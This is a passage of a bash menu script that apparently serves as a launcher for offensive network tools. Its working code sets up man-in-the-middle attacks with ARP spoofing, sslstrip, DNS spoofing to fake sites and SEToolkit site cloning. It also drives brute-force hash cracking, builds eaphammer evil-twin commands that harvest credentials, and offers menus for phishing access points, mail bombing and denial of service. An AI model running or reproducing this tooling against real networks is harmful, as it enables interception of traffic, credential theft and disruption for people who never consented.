		gnome-terminal --geometry 60x12+0+999999 -e ./l131.sh
		gnome-terminal --geometry 60x20+999999+999999 -e ./l133.sh
		gnome-terminal --geometry 60x20+999999+0 -e ./l132.sh
		sslstrip -l $PORTTCP -w /root/sslstrip.log
		echo -e "$PAKTGB"
		$READAK
		continue
	elif [[ "$MITMCH" = "33" ]]
	then
		clear
		echo -e "Enter your gateway(prefer eth0 gateway):"
		read GATENM
		echo -e ""
		echo -e "Enter the gateway's interface("$YS"Enter"$CE"=eth0):"
		read GATEINT
		if [[ "$GATEINT" = "" ]]
		then
			GATEINT="eth0"
		fi
		clear
		echo -e "Enter your target IP("$YS"r"$CE"=rescan):"
		read TARGIP
		echo -e ""
		echo -e "$PAKTC"
		$READAK
		export GATENM
		export GATEINT
		export TARGIP
		export PORTTCP
		export PORTUDP
		cd "$LPATH"/ls
		gnome-terminal --geometry 60x25+0+999999 -e ./l131.sh
		gnome-terminal --geometry 60x25+999999+0 -e ./l132.sh
		gnome-terminal --geometry 60x25+999999+999999 -e ./l133.sh
		sslstrip -l $PORTTCP -w /root/sslstrip.log
		echo -e "$PAKTGB"
		$READAK
		continue
	elif [[ "$MITMCH" = "4" ]]
	then
		leafpad /root/sslstrip.log
	#~ elif [[ "$MITMCH" = "44" ]]
	#~ then
	elif [[ "$MITMCH" = "back" || "$MITMCH" = "b" ]]
	then
		clear
		break
	elif [[ "$MITMCH" = "00" ]]
	then
		clear
		exec bash "$0"
	elif [[ "$MITMCH" = "0" ]]
	then
		clear
		exit
	fi
	done
elif [[ "$MITMATT" = "2" ]]
then
	while true
	do
	clear
	echo -e "------------------------------"$RS"MITM"$CE"-------------------------------"
	echo -e ""$YS" 1"$CE") Enable ip_forward                 "$YS"d1"$CE") Disable ip_forward"
	echo -e ""$YS" 2"$CE") Scan and select target IP         "$YS"22"$CE") I have scaned"
	echo -e ""$YS" 3"$CE") Start ARPspoofing"
	#~ echo -e ""$YS" 4"$CE") Start apache2 service             "$YS"d4"$CE") Stop apache2 service"
	echo -e ""$YS" 4"$CE") Start SEToolkit"
	echo -e ""$YS" 5"$CE") Start DNSspoofing"
	echo -e ""$YS" b"$CE") Go back"
	echo -e ""$YS" 0"$CE") EXIT"
	echo -e "Choose: "
	read -e MITMSET
	clear
	if [[ "$MITMSET" = "1" ]]
	then
		echo "1" > /proc/sys/net/ipv4/ip_forward
		echo -e "Done."
		sleep 1
	elif [[ "$MITMSET" = "d1" ]]
	then
		echo "0" > /proc/sys/net/ipv4/ip_forward
		echo -e "Done."
		sleep 1
	elif [[ "$MITMSET" = "2" ]]
	then
		route -n
		echo -e ""
		echo -e ""
		echo -e "Enter your gateway:"
		read GATENM
		echo -e ""
		echo -e "Enter the gateway's interface(e.g: wlan0):"
		read GATEINT
		while true
		do		
		clear
		nmap -sP "$GATENM"/24
		echo -e ""
		echo -e ""
		echo -e "Enter your target IP("$YS"r"$CE"=rescan):"
		read TARGIP
		if [[ "$TARGIP" = "r" ]]
		then
			continue
		else
			break
		fi
		done
	elif [[ "$MITMSET" = "22" ]]
	then
		echo -e "Enter your gateway:"
		read GATENM
		echo -e ""
		echo -e "Enter the gateway's interface(e.g: wlan0):"
		read GATEINT
		clear
		echo -e "Enter your target IP:"
		read TARGIP
	elif [[ "$MITMSET" = "3" ]]
	then
		export PAKTC
		export GATEINT
		export TARGIP
		export GATENM
		cd "$LPATH"/ls
		gnome-terminal --geometry 60x15+999999+0 -e ./l132.sh
		gnome-terminal --geometry 60x15+999999+999999 -e ./l133.sh
	#~ elif [[ "$MITMSET" = "4" ]]
	#~ then
		#~ service apache2 start
	#~ elif [[ "$MITMSET" = "d4" ]]
	#~ then
		#~ service apache2 stop
	elif [[ "$MITMSET" = "4" ]]
	then
		echo -e "Clone a website to one of the following IP(s):"
		ip addr | grep '/24' | awk -F "inet " {'print $2'} | cut -d '/' -f1
		echo -e "$PAKTC"
		$READAK
		gnome-terminal --geometry 66x40+999999+0 -e setoolkit
	elif [[ "$MITMSET" = "5" ]]
	then
		echo -e "Making you a hosts.txt file"
		echo -e ""
		echo -e "Enter your IP address that you started the server:"
		echo -e "One of this/these:"
		ip addr | grep '/24' | awk -F "inet " {'print $2'} | cut -d '/' -f1
		read -e SERVIP
		echo -e "Enter the interface of that IP(e.g: wlan0):"
		read -e INTIP
		if [[ -f ""$LPATH"/HOSTS/hosts.txt" ]]
		then
			rm "$LPATH"/HOSTS/hosts.txt
		fi
		mkdir "$LPATH"/HOSTS
		clear
		while true
		do
		clear
		echo -e "Enter the URL you want to redirect your IP from(e.g: thisis.myfakesite.com):"
		read -e URL
		echo "$SERVIP	$URL" >> "$LPATH"/HOSTS/hosts.txt
		sleep 0.2
		clear
		echo -e "Add another one as well?"$YNYES""
		read -e ANOTHERHOST
		if [[ "$ANOTHERHOST" = "n" ]]
		then
			break
		fi
		done
		clear
		echo -e "Starting dnsspoof..."
		echo -e "$PAKTC"
		$READAK
		export INTIP
		xterm -geometry 60x15+0+999999 -e 'dnsspoof -i $INTIP -f "$LPATH"/HOSTS/hosts.txt'				
	elif [[ "$MITMSET" = "back" || "$MITMSET" = "b" ]]
	then
		clear
		break
	elif [[ "$MITMSET" = "00" ]]
	then
		clear
		exec bash "$0"
	elif [[ "$MITMSET" = "0" ]]
	then
		clear
		exit
	fi
	done
elif [[ "$MITMATT" = "back" || "$MITMATT" = "b" ]]
then
	BACKL="1"
	break
elif [[ "$MITMATT" = "00" ]]
then			
	clear
	exec bash "$0"
elif [[ "$MITMATT" = "0" ]]
then
	clear
	exit
fi
}
function dagon_script
{
while true
do
	clear
	TERMINALTITLE="DAGON"
	dash_calc
	printf '\033]2;DAGON\a'
	if [[ "$HASH" = "" || "$HASH" = "\e[1;31mNONE\e[0m" ]]
	then
		HASH="\e[1;31mNONE\e[0m"
		OK=0
	fi
	if [[ "$CORV" = "" ]]
	then
		CORV="crack"
	fi
	echo -e "-----------------Basic options-----------------"
	echo -e ""$YS" 1"$CE") Specify your hash(es)        CURRENT:$HASH"
	echo -e ""$YS" 2"$CE") Crack/verify                 CURRENT:$CORV"
	if [[ -f /root/lscript/hashlog.txt ]]
	then
		echo -e ""$YS" 3"$CE") View your last log"
	else
		echo -e ""$RS" 3"$CE") View your last log"
	fi
	echo -e "--------------------Optional--------------------"
	if [[ "$DICTATTACK" = "" ]]
	then
		DICTATTACK="OFF"
	fi
	echo -e ""$YS" 4"$CE") Dictionary attack            CURRENT:$DICTATTACK"
	if [[ "$DICT" = "" && $DICTATTACK = "OFF" ]]
	then
		DICT="OFF"
	elif [[ "$DICT" = "\e[1;31mNONE\e[0m" && $DICTATTACK = "OFF" ]]
	then
		DICT="OFF"
	elif [[ "$DICT" = "OFF" && $DICTATTACK = "ON" ]]
	then
		DICT="\e[1;31mNONE\e[0m"
	elif [[ "$DICT" = "" && $DICTATTACK = "ON" ]]
	then
		DICT="\e[1;31mNONE\e[0m"
	fi
	if [[ "$DICTTYPE" = 1 ]]
	then
		DICT="$DICTPATH"
	elif [[ "$DICTTYPE" = 2 ]]
	then
		DICT="multiple"
	elif [[ "$DICTTYPE" = 3 ]]
	then
		DICT="$DICTPATH folder"
	fi
	echo -e "   "$YS"5"$CE") Specify dictionary/ies     CURRENT:$DICT"
	echo -e "------------------------------------------------"
	echo -e ""$YS" b"$CE") Go back              "$YS"update"$CE") Update dagon"
	echo -e ""$YS"start"$CE") Start"
	echo -e "Choose: "
	read DAGON
	clear
	if [[ "$DAGON" = "back" || "$DAGON" = "b" ]]
	then
		break
	elif [[ "$DAGON" = "4" ]]
	then
		if [[ "$DICTATTACK" = "OFF" ]]
		then
			DICTATTACK="ON"
		else
			DICTATTACK="OFF"
		fi
	elif [[ "$DAGON" = "update" ]]
	then
		cd /root/dagon
		python dagon.py --update
		sleep 3
	elif [[ "$DAGON" = "start" ]]
	then
		if [[ "$HASH" = "" || "$HASH" = "\e[1;31mNONE\e[0m" ]]
		then
			echo -e ""$RS"No hash selected."$CE""
			sleep 3
		fi
		if [[ "$DICTATTACK" = "ON" && $DICT = "\e[1;31mNONE\e[0m" ]]
		then
			echo -e ""$RS"No dictionary selected, but dictionary option is enabled"$CE""
			sleep 5
			continue
		fi
		cd /root/dagon
		if [[ "$HASHTYPE" = 1 ]]
		then
			if [[ "$CORV" = "crack" ]]
			then
				HASHCOMMAND="python dagon.py -c "$HASH" --bruteforce"
			else
				HASHCOMMAND="python dagon.py -v "$HASH""
			fi
		elif [[ "$HASHTYPE" = 2 || "$HASHTYPE" = 3 ]]
		then
			if [[ "$CORV" = "crack" ]]
			then
				HASHCOMMAND="python dagon.py -l "$HASH" --bruteforce"
			else
				HASHCOMMAND="python dagon.py -V "$HASH""
			fi
		fi
		if [[ "$DICTATTACK" = "ON" ]]
		then
			if [[ "$DICTTYPE" = 1 ]]
			then
				DICTCOMMAND="-w $DICTPATH"
			elif [[ "$DICTTYPE" = 2 ]]
			then
				DICTCOMMAND="-W $DICTPATH"
			elif [[ "$DICTTYPE" = 3 ]]
			then
				DICTCOMMAND="-D $DICTPATH"	
			fi
		else
			DICTCOMMAND=""
		fi	
		
	$HASHCOMMAND $DICTCOMMAND | tee "$LPATH/hashlog.txt"
	echo -e "$PAKTGB"
	$READAK
	elif [[ "$DAGON" = 5 ]]
	then
		echo -e ""$YS" 1"$CE") Select one disctionary"
		echo -e ""$YS" 2"$CE") Select multiple disctionaries"
		echo -e ""$YS" 3"$CE") Select a folder with disctionaries"
		echo -e ""$YS" b"$CE") Go back"
		echo -e "Choose: "
		read DICTSEL
		clear
		if [[ "$DICTSEL" = 1 ]]
		then
			echo -e "Type the path of the dictionary:"
			read DICTPATH
			if [[ ! -f "$DICTPATH" ]]
			then
				echo -e ""$RS"No such file"$CE""
				sleep 2
				continue
			fi
			DICTTYPE=1
		elif [[ "$DICTSEL" = 2 ]]
		then
			echo -e "Type the path of the first dictionary:"
			read DICTPATH
			if [[ ! -f "$DICTPATH" ]]
			then
				echo -e ""$RS"No such file"$CE""
				sleep 2
				continue
			fi
			while true
			do
				clear
				echo -e ""$RS"----------TO STOP, TYPE 0----------"
				echo -e "Type the path of the next dictionary: "
				read DICTNEXT
				if [[ "$DICTNEXT" = "0" || "$DICTNEXT" = "o" || "$DICTNEXT" = "O" ]]
				then
					DICTTYPE=2
					break
				fi
			if [[ ! -f "$DICTNEXT" ]]
			then
				echo -e ""$RS"No such file"$CE""
				sleep 2
				continue
			fi
				DICTPATH=""$DICTPATH","$DICTNEXT""
			done
		elif [[ "$DICTSEL" = 3 ]]
		then
			echo -e "Type the path of the folder:"
			read DICTPATH
			if [[ ! -d "$DICTPATH" ]]
			then
				echo -e ""$RS"No such folder"$CE""
				sleep 2
				continue
			fi
			DICTTYPE=3
		elif [[ "$DICTSEL" = "back" || "$DICTSEL" = "b" ]]
		then
			continue
		fi
	elif [[ "$DAGON" = 3 ]]
	then
		if [[ ! -f /root/lscript/hashlog.txt ]]
		then
			echo -e ""$RS"No log found."$CE""
			sleep 2
		else
			cat /root/lscript/hashlog.txt
			echo -e "$PAKTGB"
			$READAK
		fi
	elif [[ "$DAGON" = 1 ]]
	then
		clear
		echo -e ""$YS" 1"$CE") Type a hash"
		echo -e ""$YS" 2"$CE") Type multiple hashes"
		echo -e ""$YS" 3"$CE") Select a file with hashes"
		echo -e ""$YS" b"$CE") Go back"
		echo -e "Choose: "
		read HASHES
		clear
		if [[ "$HASHES" = "back" || "$HASHES" = "b" ]]
		then
			continue
		elif [[ "$HASHES" = 1 ]]
		then
			echo -e "Type your hash: "
			read HASH
			HASHTYPE=1
		elif [[ "$HASHES" = 2 ]]
		then
			echo -e "Type your first hash: "
			read HASH
			echo -e "$HASH" > $LPATH/hashes.txt
			while true
			do
				clear
				echo -e ""$RS"----------TO STOP, TYPE 0----------"
				echo -e "Type your next hash: "
				read HASH
				if [[ "$HASH" = "0" || "$HASH" = "o" || "$HASH" = "O" ]]
				then
					HASH="multiple"
					break
				fi
				echo -e "$HASH" >> $LPATH/hashes.txt
			done
			HASHTYPE=2
		elif [[ "$HASHES" = 3 ]]
		then
			echo -e "Type the full path of the file: "
			read HASHPATH
			if [[ ! -f "$HASHPATH" ]]
			then
				echo -e ""$RS"There is not such file."$CE""
				sleep 3
			else
				HASH="$HASHPATH"
			fi
			HASHTYPE=3
		fi
	elif [[ "$DAGON" = 00 ]]
	then
		exec bash $0
	elif [[ "$DAGON" = 0 ]]
	then
		clear
		exit
	elif [[ "$DAGON" = 2 ]]
	then
		if [[ "$CORV" = "crack" ]]
		then
			CORV="verify"
		else
			CORV="crack"
		fi
	fi
done
}
function eaphammer_automation
{
			while true
			do
				clear
				TERMINALTITLE="EAPHAMMER"
				dash_calc
				printf '\033]2;EAPHAMMER\a'
				if [[ "$EAPHIFACE" = "" ]]
				then
					EAPHIFACE="$WLANN"
				fi
				if [[ "$EAPHESSID" = "" ]]
				then
					EAPHESSID=""$RS"NONE"$CE""
					OK1=0
				elif [[ "$EAPHESSID" != "\e[1;31mNONE\e[0m" ]]
				then
					OK1=1
				fi
				if [[ "$EAPHBSSID" = "" ]]
				then
					EAPHBSSID=""$RS"NONE"$CE""
					OK1=0
				fi
				if [[ "$EAPHCHANNEL" = "" ]]
				then
					EAPHCHANNEL=""$RS"NONE"$CE""
					OK1=0
				fi
				if [[ "$EAPHWPA" = "" ]]
				then
					EAPHWPA="2"
				fi
				if [[ "$EAPHAUTH" = "" ]]
				then
					EAPHAUTH=""$RS"NONE"$CE""
					OK1=0
				fi
				if [[ "$EAPHCREDS" = "" ]]
				then
					EAPHCREDS="OFF"
				fi
				if [[ "$EAPHHOSTILE" = "" ]]
				then
					EAPHHOSTILE="OFF"
				fi
				if [[ "$EAPHCAPTIVE" = "" ]]
				then
					EAPHCAPTIVE="OFF"
				fi
				if [[ "$EAPHPIVOT" = "" ]]
				then
					EAPHPIVOT="OFF"
				fi
				if [[ "$EAPHKARMA" = "" ]]
				then
					EAPHKARMA="OFF"
				fi
				if [[ "$EAPHAIRCRACK" = "" ]]
				then
					EAPHAIRCRACK="OFF"
				fi
				if [[ "$EAPHINTAUTO" = "" ]]
				then
					EAPHINTAUTO="OFF"
				fi
				if [[ "$EAPHAIRCRACK" = "OFF" && "$EAPHINTAUTO" = "OFF" && "$EAPHWORD" = "" ]]
				then
					EAPHWORD="OFF"
				fi
				if [[ "$EAPHAIRCRACK" = "OFF" && "$EAPHINTAUTO" = "OFF" && "$EAPHWORD" = "OFF" ]]
				then
					EAPHWORD="OFF"
				fi
				OK2=1
				if [[ "$EAPHAIRCRACK" != "OFF" ]]
				then
					if [[ "$EAPHWORD" = "OFF" || "$EAPHWORD" = "\e[1;31mNONE\e[0m" ]]
					then
						EAPHWORD="\e[1;31mNONE\e[0m"
						OK2=0
					fi
				fi
				if [[ "$EAPHINTAUTO" = "ON" || "$EAPHWORD" = "\e[1;31mNONE\e[0m" ]]
				then
					if [[ "$EAPHWORD" = "OFF" ]]
					then
						EAPHWORD="\e[1;31mNONE\e[0m"
						OK2=0
					fi
				fi
				if [[ "$EAPHINTAUTO" = "OFF" && "$EAPHAIRCRACK" = "OFF" ]]
				then
					if [[ "$EAPHWORD" = "\e[1;31mNONE\e[0m" ]]
					then
						EAPHWORD="OFF"
					fi
				fi
				echo -e ""$YS" 1"$CE") Create a new RADIUS cert for your AP"
				echo -e ""$YS" 2"$CE") Set your interface for the AP               CURRENT: $EAPHIFACE"
				echo -e ""$YS" 3"$CE") Specify access point ESSID                  CURRENT: $EAPHESSID"
				echo -e ""$YS" 4"$CE") Specify access point BSSID                  CURRENT: $EAPHBSSID"
				echo -e ""$YS" 5"$CE") Specify access point channel                CURRENT: $EAPHCHANNEL"
				echo -e ""$YS" 6"$CE") Specify WPA type                            CURRENT: $EAPHWPA"
				echo -e ""$YS" 7"$CE") Specify auth type                           CURRENT: $EAPHAUTH"
				echo -e ""$YS" 8"$CE") Harvest EAP creds                           CURRENT: $EAPHCREDS"
				echo -e ""$YS" 9"$CE") Force clients to connect to hostile portal  CURRENT: $EAPHHOSTILE"
				echo -e ""$YS"10"$CE") Force clients to connect to captive portal  CURRENT: $EAPHCAPTIVE"
				echo -e ""$YS"11"$CE") Perform an indirect wireless pivot          CURRENT: $EAPHPIVOT"
				echo -e ""$YS"12"$CE") Enable karma                                CURRENT: $EAPHKARMA"
				echo -e ""$YS"13"$CE") Use autocrack/add with remote cracking rig  CURRENT: $EAPHAIRCRACK"
				echo -e ""$YS"14"$CE") Use internal autocrack                      CURRENT: $EAPHINTAUTO"
				echo -e ""$YS"15"$CE") Specify wordlist for autocrack              CURRENT: $EAPHWORD"
				echo -e ""$YS"start"$CE") Start "
				echo -e ""$YS"00"$CE") Main menu"
				echo -e ""$YS" back"$CE") Go back"
				echo -e "Choose: "
				read EAPH
				clear
				if [[ "$EAPH" = 1 ]]
				then
					cd /root/eaphammer
					./eaphammer --cert-wizard
				elif [[ "$EAPH" = 2 ]]
				then
					echo -e "Type the interface you want to use: "
					read EAPHIFACE
				elif [[ "$EAPH" = 3 ]]
				then
					echo -e "Type the ESSID: "
					read EAPHESSID
				elif [[ "$EAPH" = 4 ]]
				then
					echo -e "Type the BSSID: "
					read EAPHBSSID
				elif [[ "$EAPH" = 5 ]]
				then
					echo -e "Type the channel: "
					read EAPHCHANNEL
				elif [[ "$EAPH" = 6 ]]
				then
					if [[ "$EAPHWPA" = 1 ]]
					then
						EAPHWPA=2
					else
						EAPHWPA=1
					fi
				elif [[ "$EAPH" = 7 ]]
				then
					echo -e ""$YS" 1"$CE") Open"
					echo -e ""$YS" 2"$CE") ttls"
					echo -e ""$YS" 3"$CE") peap"
					echo -e "Choose: "
					read PAUTH
					if [[ "$PAUTH" = 1 ]]
					then
						EAPHAUTH="open"
					elif [[ "$PAUTH" = 2 ]]
					then
						EAPHAUTH="ttls"
					elif [[ "$PAUTH" = 3 ]]
					then
						EAPHAUTH="peap"
					fi
				elif [[ "$EAPH" = 8 ]]
				then
					if [[ "$EAPHCREDS" = "OFF" ]]
					then
						EAPHCREDS="ON"
					else
						EAPHCREDS="OFF"
					fi
				elif [[ "$EAPH" = 9 ]]
				then
					if [[ "$EAPHHOSTILE" = "OFF" ]]
					then
						EAPHHOSTILE="ON"
					else
						EAPHHOSTILE="OFF"
					fi
				elif [[ "$EAPH" = 10 ]]
				then
					if [[ "$EAPHCAPTIVE" = "OFF" ]]
					then
						EAPHCAPTIVE="ON"
					else
						EAPHCAPTIVE="OFF"
					fi
				elif [[ "$EAPH" = 11 ]]
				then
					if [[ "$EAPHPIVOT" = "OFF" ]]
					then
						EAPHPIVOT="ON"
					else
						EAPHPIVOT="OFF"
					fi
				elif [[ "$EAPH" = 12 ]]
				then
					if [[ "$EAPHKARMA" = "OFF" ]]
					then
						EAPHKARMA="ON"
					else
						EAPHKARMA="OFF"
					fi
				elif [[ "$EAPH" = 13 ]]
				then
					if [[ "$EAPHAIRCRACK" = "OFF" ]]
					then
						clear
						echo -e "Hostname: "
						read HOSTN
						echo -e "Port: "
						read PORT
						clear
						EAPHAIRCRACK=""$HOSTN":"$PORT""
					else
						EAPHAIRCRACK="OFF"
					fi
				elif [[ "$EAPH" = 14 ]]
				then
					if [[ "$EAPHINTAUTO" = "OFF" ]]
					then
						EAPHINTAUTO="ON"
					else
						EAPHINTAUTO="OFF"
					fi
				elif [[ "$EAPH" = 15 ]]
				then
					if [[ "$EAPHWORD" != "OFF" && "$EAPHWORD" != "\e[1;31mNONE\e[0m" ]]
					then
						EAPHWORD="OFF"
					else
						clear
						echo -e "Type the full wordlist path: "
						read EAPHWORD
					fi
				elif [[ "$EAPH" = "back" || "$EAPH" = "b" ]]
				then
					clear
					break
				elif [[ "$EAPH" = "00" ]]
				then
					clear
					exec bash $0
				elif [[ "$EAPH" = "0" ]]
				then
					clear
					exit
				elif [[ "$EAPH" = "start" ]]
				then
					clear
					if [[ "$OK1" != 1 ]]
					then
						echo -e "You haven't specified the important requirements"
						sleep 4
						continue
					fi
					if [[ "$OK2" != 1 ]]
					then
						echo -e "You haven't specified a wordlist for the autocrack"
						sleep 4
						continue
					fi
				if [[ "$EAPHCREDS" = "ON" ]]
				then
					CREDS="--creds"
				else
					CREDS=""
				fi
				if [[ "$EAPHHOSTILE" = "ON" ]]
				then
					HOSTILE="--hostile-portal"
				else
					HOSTILE=""
				fi
				if [[ "$EAPHCAPTIVE" = "ON" ]]
				then
					CAPTIVE="--captive-portal"
				else
					CAPTIVE=""
				fi
				if [[ "$EAPHPIVOT" = "ON" ]]
				then
					PIVOT="--pivot"
				else
					PIVOT=""
				fi
				if [[ "$EAPHKARMA" = "ON" ]]
				then
					KARMA="--karma"
				else
					KARMA=""
				fi
				if [[ "$EAPHINTAUTO" = "ON" ]]
				then
					INTAUTO="--local-autocrack"
				else
					INTAUTO=""
				fi
				if [[ "$EAPHAIRCRACK" != "OFF" ]]
				then
					AIRCRACK="--remote-autocrack $EAPHAIRCRACK"
				else
					AIRCRACK=""
				fi
				if [[ "$EAPHAIRCRACK" != "OFF" || "$EAPHINTAUTO" != "OFF" ]]
				then
					WORD="--wordlist $EAPHWORD"
				else
					WORD=""
				fi
				IFACE="-i $EAPHIFACE"
				CHANNEL="-c $EAPHCHANNEL"
				ESSID="-e $EAPHESSID"
				BSSID="-b $EAPHBSSID"
				WPA="--wpa $EAPHWPA"
				AUTH="--auth $EAPHAUTH"
					cd /root/eaphammer
					./eaphammer $IFACE $CHANNEL $BSSID $ESSID $WPA $AUTH $PIVOT $KARMA $INTAUTO $CAPTIVE $HOSTILE $CREDS $AIRCRACK $WORD
					
				fi
			done
}
function wifi_tools
{
	while true
	do
	printf '\033]2;WIFI TOOLS\a'
	clear
	TERMINALTITLE="WIFI TOOLS"
	dash_calc
	if [[ -d /root/fluxion ]]
	then
		echo -e ""$YS" 1"$CE") Fluxion            Multitool-Fake AP with pass confirmation"
	else
		echo -e ""$RS" 1"$CE") "$RS"Fluxion"$CE"            Multitool-Fake AP with pass confirmation"
	fi
	if [[ -f /usr/bin/wifite ]]
	then
		echo -e ""$YS" 2"$CE") Wifite             Multitool"
	else
		echo -e ""$RS" 2"$CE") "$RS"Wifite"$CE"             Multitool"
	fi
	if [[ -d /root/wifiphisher ]]
	then
		echo -e ""$YS" 3"$CE") Wifiphisher        Multitool-Fake AP etc.."
	else
		echo -e ""$RS" 3"$CE") "$RS"Wifiphisher"$CE"        Multitool-Fake AP etc.."
	fi
	if [[ -d /root/Zatacker ]]
	then
		echo -e ""$YS" 4"$CE") Zatacker           MITM-NMAP-Mail Spammer..(Install it manually)"
	else
		echo -e ""$RS" 4"$CE") "$RS"Zatacker"$CE"           MITM-NMAP-Mail Spammer..(Install it manually)"
	fi
	if [[ -d /root/morpheus ]]
	then
		echo -e ""$YS" 5"$CE") Morpheus           ------------ULTIMATE MITM SUIT------------"
	else
		echo -e ""$RS" 5"$CE") "$RS"Morpheus"$CE"           ------------ULTIMATE MITM SUIT------------"
	fi
	if [[ -d /root/osrframework ]]
	then
		echo -e ""$YS" 6"$CE") Osrfconsole        Checks usernames-phones to platforms etc.."
	else
		echo -e ""$RS" 6"$CE") "$RS"Osrfconsole"$CE"        Checks usernames-phones to platforms etc.."
	fi
	if [[ -d /root/hakkuframework ]]
	then
		echo -e ""$YS" 7"$CE") Hakku              Multitool-mail bomb-sniffs-cracks etc.."
	else
		echo -e ""$RS" 7"$CE") "$RS"Hakku"$CE"              Multitool-mail bomb-sniffs-cracks etc.."
	fi
	if [[ -d /root/Trity ]]
	then
		echo -e ""$YS" 8"$CE") Trity              Multitool-locate ip-email bombs-brutforse etc.."
	else
		echo -e ""$RS" 8"$CE") "$RS"Trity"$CE"              Multitool-locate ip-email bombs-brutforse etc.."
	fi
	if [[ -d /root/Dracnmap ]]
	then				
		echo -e ""$YS" 9"$CE") Dracnmap           Many scan options"
	else
		echo -e ""$RS" 9"$CE") "$RS"Dracnmap"$CE"           Many scan options"
	fi
	if [[ -d "/usr/share/fern-wifi-cracker" ]]
	then	
		echo -e ""$YS"10"$CE") Fern               Wifi cracker GUI"
	else
		echo -e ""$RS"10"$CE") "$RS"Fern"$CE"               Wifi cracker GUI"
	fi
	if [[ -f /usr/sbin/netdiscover ]]
	then	
		echo -e ""$YS"11"$CE") Netdiscover        IPs and MACs on your net"
	else
		echo -e ""$RS"11"$CE") "$RS"Netdiscover"$CE"        IPs and MACs on your net"
	fi
	if [[ -d /root/kickthemout ]]
	then	
		echo -e ""$YS"12"$CE") KickThemOut        Kick clients out of your network"
	else
		echo -e ""$RS"12"$CE") "$RS"KickThemOut"$CE"        Kick clients out of your network"
	fi
	if [[ -d "/usr/share/ghost-phisher" ]]
	then	
		echo -e ""$YS"13"$CE") Ghost-Phisher      Fake AP,MITM,Session hijacking etc..."
	else
		echo -e ""$RS"13"$CE") "$RS"Ghost-Phisher"$CE"      Fake AP,MITM,Session hijacking etc..."
	fi
	if [[ -d /root/The-Eye ]]
	then	
		echo -e ""$YS"14"$CE") The Eye            Detects ARP poisoning DNS spoofing etc..."
	else
		echo -e ""$RS"14"$CE") "$RS"The Eye"$CE"            Detects ARP poisoning DNS spoofing etc..."
	fi
	if [[ -d /root/xerxes ]]
	then	
		echo -e ""$YS"15"$CE") Xerxes             The most powerful DoS tool(CAUTION)"
	else
		echo -e ""$RS"15"$CE") "$RS"Xerxes"$CE"             The most powerful DoS tool(CAUTION)"
	fi
	#~ echo -e ""$YS"16"$CE") ShARP(problematic) Detects who is spoofing on your network"
	if [[ -d /root/mdk3-master ]]
	then
		echo -e ""$YS"16"$CE") Mdk3-master        Tries to lock / reboot AP and more..."
	else
		echo -e ""$RS"16"$CE") "$RS"Mdk3-master"$CE"        Tries to lock / reboot AP and more..."
	fi
	if [[ -d /root/mdk3-master ]]
	then
		echo -e ""$YS"17"$CE") Mdk3-master        Tries to reboot the AP and unlock the WPS lock"
	else
		echo -e ""$RS"17"$CE") "$RS"Mdk3-master"$CE"        Tries to reboot the AP and unlock the WPS lock"
	fi
	if [[ -d /root/KatanaFramework ]]
	then
		echo -e ""$YS"18"$CE") Katana Framework   Many penetration testing features"
	else
		echo -e ""$RS"18"$CE") "$RS"Katana Framework"$CE"   Many penetration testing features"
	fi
	if [[ -d /root/airgeddon ]]
	then
		echo -e ""$YS"19"$CE") Airgeddon          Evil twin-WPA WPA2-WEP-WPS and more"
	else
		echo -e ""$RS"19"$CE") "$RS"Airgeddon"$CE"          Evil twin-WPA WPA2-WEP-WPS and more"
	fi
	if [[ -f /usr/bin/websploit ]]
	then
		echo -e ""$YS"20"$CE") Websploit          Wireless attack-multitool"
	else
		echo -e ""$RS"20"$CE") "$RS"Websploit"$CE"          Wireless attack-multitool"
	fi
	if [[ -d /etc/openvas ]]
	then
		echo -e ""$YS"21"$CE") Openvas            Vulnerability scanner LAN"
	else
		echo -e ""$RS"21"$CE") "$RS"Openvas"$CE"            Vulnerability scanner LAN"
	fi
	if [[ -f /usr/bin/ipscan ]]
	then
		echo -e ""$YS"22"$CE") Angry IP Scanner   IP Scanner"
	else
		echo -e ""$RS"22"$CE") "$RS"Angry IP Scanner"$CE"   IP Scanner"
	fi
	if [[ -d /root/routersploit ]]
	then
		echo -e ""$YS"23"$CE") Routersploit       Find/exploit router vulnerabilities"
	else
		echo -e ""$RS"23"$CE") "$RS"Routersploit"$CE"       Find/exploit router vulnerabilities"
	fi
	if [[ -d /root/nWatch ]]
	then
		echo -e ""$YS"24"$CE") nWatch             IP scanner/OS detection"
	else
		echo -e ""$RS"24"$CE") "$RS"nWatch"$CE"             IP scanner/OS detection"
	fi
	if [[ -d /root/eternal_scanner ]]
	then
		echo -e ""$YS"25"$CE") Eternal scanner    Scans hosts for eternalblue vulnerabilities"
	else
		echo -e ""$RS"25"$CE") "$RS"Eternal scanner"$CE"    Scans hosts for eternalblue vulnerabilities"
	fi
	if [[ -d /root/eaphammer ]]
	then
		echo -e ""$YS"26"$CE") Eaphammer          Evil twin attacks against WPA2-Enterprise networks. "
	else
		echo -e ""$RS"26"$CE") "$RS"Eaphammer"$CE"          Evil twin attacks against WPA2-Enterprise networks. "
	fi
	echo -e ""$YS" b"$CE") Go back"
	echo -e ""$YS"00"$CE") Main menu"
	#echo -e ""$YS" 0"$CE") EXIT"
	echo -e "Choose: "
	read -e APPP
	clear
	if [[ "$APPP" = "1" ]]
	then
		if [[ -d /root/fluxion ]]
		then
			cd /root/fluxion
			./fluxion
			cd
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_fluxion
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "2" ]]
	then
		if [[ -f /usr/bin/wifitee ]]
		then
			wifite
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_wifite
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "3" ]]
	then
		if [[ -d /root/wifiphisher ]]
		then
			echo -e "Do you have 1 or 2 wireless interfaces?: "
			read ONEORTWO
			if [[ "$ONEORTWO" = "1" ]]
			then
				clear
				echo -e "Note that with only 1 wireless interface, wifiphisher doesn't deauthenticate the AP."
				sleep 1
				echo -e ""
				echo -e "$PAKTC"
				$READAK
				clear
				wifiphisher -nJ
			else
				clear
				wifiphisher
			fi
		else
			echo -e "$TNI"
			read INSTALL
			if [[ "$INSTALL" = "install" ]]
			then
				install_wifiphisher
			else
				continue
			fi
		fi
	elif [[ "$APPP" = "4" ]]
	then
		if [[ -d /root/Zatacker ]]
		then
			if [[ -d "/root/Zatacker" ]]
			then	
				cd /root/Zatacker
				./ZT.sh
				cd
			else
				echo -e "You have to install it manually since its not on github.Sorry."
				sleep 4
				exec bash "$0"
			fi
		else
			echo -e "$TNI"
			read INSTALL
